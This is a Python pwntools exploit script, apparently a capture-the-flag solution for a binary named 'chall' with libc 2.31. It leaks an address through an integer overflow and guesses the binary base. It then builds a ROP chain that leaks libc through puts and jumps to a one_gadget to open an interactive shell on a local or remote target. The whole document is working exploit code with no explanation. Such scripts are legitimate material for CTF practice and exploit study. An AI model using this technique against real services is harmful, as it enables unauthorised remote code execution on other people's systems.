#!/usr/bin/env python3
from pwn import *

BIN_FILE  = './chall'
LIBC_FILE = './libc-2.31.so'

HOST = args.HOST or 'localhost'
PORT = int(args.PORT or 1337)

context(os='linux', arch='amd64')
# context.terminal = ['tmux', 'splitw', '-h']
# context.log_level = 'debug'

binf = ELF(BIN_FILE)
libc = ELF(LIBC_FILE) if LIBC_FILE != '' else None

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.GDB:
        return gdb.debug(BIN_FILE)
    else:
        return process(BIN_FILE)

def calc_leak(leak):
    for i in range(0x5500, 0x5800):
        for j in range(0xb6c, 0x100000b6c, 0x1000):
            if (i * j) % (2 ** 32) == leak:
                success('Guessing succeeded!')
                return (i << 32) + j
    warning('Guessing failed...')
    exit()

def rop(io, off, payload):
    for gad in payload:
        io.sendlineafter(': ', str(off))
        io.sendlineafter('$', str(gad & 0xffffffff))
        io.sendlineafter(': ', str(gad >> 32))
        off += 1

def attack(io):
    n = (1 << 64) // 8

    io.sendlineafter(': ', str(n))
    io.recvuntil('$')
    leak = int(io.recvline().rstrip(b'\n'))
    leak = calc_leak(leak)
    info('Leaked: {:#x}'.format(leak))
    binf.address = leak - 191 - binf.sym.main
    info('Binary base: {:#x}'.format(binf.address))

    POPRDI = binf.address + 0xd53
    payload_1 = [
        POPRDI,
        binf.got.puts,
        binf.plt.puts,
        binf.sym.main
    ]
    io.sendlineafter('] ', '1')
    rop(io, 11, payload_1)
    io.sendlineafter(': ', '-1')

    io.recvuntil('work!\n')
    libc_leak = unpack(io.recv(6), 'all')
    libc.address = libc_leak - libc.sym.puts
    info('Libc base: {:#x}'.format(libc.address))

    ONE_GADGET = [0xe3b2e, 0xe3b31, 0xe3b34]
    payload_2 = [libc.address + ONE_GADGET[1]]
    io.sendlineafter(': ', str(n))
    io.sendlineafter('] ', '1')
    rop(io, 11, payload_2)
    io.sendlineafter(': ', '-1')
    
def main():
    io = start()
    attack(io)
    io.interactive()

if __name__ == '__main__':
    main()
